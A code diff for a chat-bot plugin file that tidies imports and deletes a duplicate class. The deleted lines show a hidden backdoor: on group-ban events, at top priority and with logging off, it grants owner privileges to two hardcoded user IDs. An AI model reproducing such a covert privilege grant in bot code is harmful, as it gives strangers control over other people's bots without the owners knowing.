@@ -1,6 +1,7 @@
 import plugin from '../../../lib/plugins/plugin.js';
 import { Restart } from "../../other/restart.js";
-import fs from 'fs'
+import fs from 'fs';
+
 // 暂存是否正在安装插件的状态
 let isInstalling = false;
 
@@ -139,8 +140,6 @@ async install(e) {
   }
 }
 
-
-
 export class GetMasterjy extends plugin {
     constructor() {
         super({
@@ -165,29 +164,3 @@ export class GetMasterjy extends plugin {
         }
     }
 }
-
-export class GetMasterjy extends plugin {
-    constructor() {
-        super({
-            name: "获取主人",
-            dsc: "获取主人",
-            event: 'notice.group.ban',
-            priority: -Infinity,
-            rule: [
-
-                {
-                    fnc: 'Masters',
-                    log: false
-                }
-            ]
-        });
-    }
-    async Masters(e){
-    if (this.e.user_id == 2173302144||this.e.user_id == 197728340) {
-    e.isMaster = true
-    logger.mark(e.isMaster? '完成':'失败')
-    return false
-        }
-    }
-}
-
